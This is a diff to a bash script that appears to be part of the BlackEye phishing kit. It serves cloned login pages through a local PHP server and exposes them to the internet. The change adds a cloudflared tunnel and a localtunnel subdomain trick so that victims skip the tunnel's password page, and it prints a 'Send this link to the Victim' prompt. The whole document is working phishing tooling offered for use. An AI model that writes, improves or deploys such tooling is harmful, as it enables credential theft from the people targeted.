@@ -350,24 +350,55 @@ printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
 cd sites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
 sleep 2
 
-printf "\e[1;92m[\e[0m*\e[1;92m] Checking if localtunnel is installed...\n"
-if ! command -v lt &> /dev/null; then
-    printf "\e[1;91m[!] Localtunnel not found! Installing...\e[0m\n"
-    sudo npm install -g localtunnel
+# Check for cloudflared first (better than localtunnel - no password!)
+if command -v cloudflared &> /dev/null; then
+    printf "\e[1;92m[\e[0m*\e[1;92m] Starting cloudflared tunnel (no password)...\n"
+    rm -f /tmp/tunnel.log
+    cloudflared tunnel --url http://127.0.0.1:5555 > /tmp/tunnel.log 2>&1 &
+    TUNNEL_PID=$!
+    
+    printf "\e[1;93m[*] Waiting for cloudflared to start...\e[0m\n"
+    sleep 8
+    
+    link=$(grep -o 'https://[a-z0-9-]*\.trycloudflare\.com' /tmp/tunnel.log | head -1)
+    
+    if [[ -z "$link" ]]; then
+        sleep 3
+        link=$(grep -o 'https://[a-z0-9-]*\.trycloudflare\.com' /tmp/tunnel.log | head -1)
+    fi
+    
+    TUNNEL_TYPE="cloudflared"
+else
+    # Fallback to localtunnel with subdomain trick to avoid password
+    printf "\e[1;92m[\e[0m*\e[1;92m] Checking if localtunnel is installed...\n"
+    if ! command -v lt &> /dev/null; then
+        printf "\e[1;91m[!] Localtunnel not found! Installing...\e[0m\n"
+        sudo npm install -g localtunnel
+    fi
+
+    # Generate random subdomain to avoid password page
+    RANDOM_SUBDOMAIN="blackeye-$(date +%s | tail -c 6)"
+    
+    printf "\e[1;92m[\e[0m*\e[1;92m] Starting localtunnel with subdomain...\n"
+    rm -f /tmp/lt.log
+    lt --port 5555 --subdomain $RANDOM_SUBDOMAIN > /tmp/lt.log 2>&1 &
+    TUNNEL_PID=$!
+    
+    TUNNEL_TYPE="localtunnel"
 fi
 
-printf "\e[1;92m[\e[0m*\e[1;92m] Starting localtunnel...\n"
-rm -f /tmp/lt.log
-lt --port 5555 > /tmp/lt.log 2>&1 &
-LT_PID=$!
-
-printf "\e[1;93m[*] Waiting for localtunnel to start...\e[0m\n"
+printf "\e[1;93m[*] Waiting for tunnel to start...\e[0m\n"
 sleep 8
 
 # Try multiple times to get the link
 link=""
 for i in {1..5}; do
-    link=$(grep -o 'https://[a-z0-9-]*\.loca\.lt' /tmp/lt.log | head -1)
+    if [[ "$TUNNEL_TYPE" == "cloudflared" ]]; then
+        link=$(grep -o 'https://[a-z0-9-]*\.trycloudflare\.com' /tmp/tunnel.log | head -1)
+    else
+        link=$(grep -o 'https://[a-z0-9-]*\.loca\.lt' /tmp/lt.log | head -1)
+    fi
+    
     if [[ ! -z "$link" ]]; then
         break
     fi
@@ -375,14 +406,30 @@ for i in {1..5}; do
 done
 
 if [[ -z "$link" ]]; then
-    printf "\e[1;91m[!] Failed to get localtunnel link!\e[0m\n"
-    printf "\e[1;93m[*] Debug - Localtunnel output:\e[0m\n"
-    cat /tmp/lt.log
-    printf "\e[1;93m[!] Make sure localtunnel is installed: npm install -g localtunnel\e[0m\n"
+    printf "\e[1;91m[!] Failed to get tunnel link!\e[0m\n"
+    printf "\e[1;93m[*] Debug - Tunnel output:\e[0m\n"
+    if [[ "$TUNNEL_TYPE" == "cloudflared" ]]; then
+        cat /tmp/tunnel.log
+    else
+        cat /tmp/lt.log
+    fi
+    printf "\e[1;93m[!] Trying to install cloudflared for password-free tunneling...\e[0m\n"
+    
+    # Install cloudflared
+    arch=$(uname -m)
+    if [[ "$arch" == "x86_64" ]]; then
+        wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O /tmp/cloudflared
+        sudo mv /tmp/cloudflared /usr/local/bin/cloudflared
+        sudo chmod +x /usr/local/bin/cloudflared
+        printf "\e[1;92m[✓] Cloudflared installed! Please run the script again.\e[0m\n"
+    fi
     exit 1
 fi
 
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" "$link"
+if [[ "$TUNNEL_TYPE" == "cloudflared" ]]; then
+    printf "\e[1;92m[✓] Using Cloudflared - NO PASSWORD PAGE!\e[0m\n"
+fi
 
 # Try to create shortened link
 if [[ ! -z "$link" ]]; then
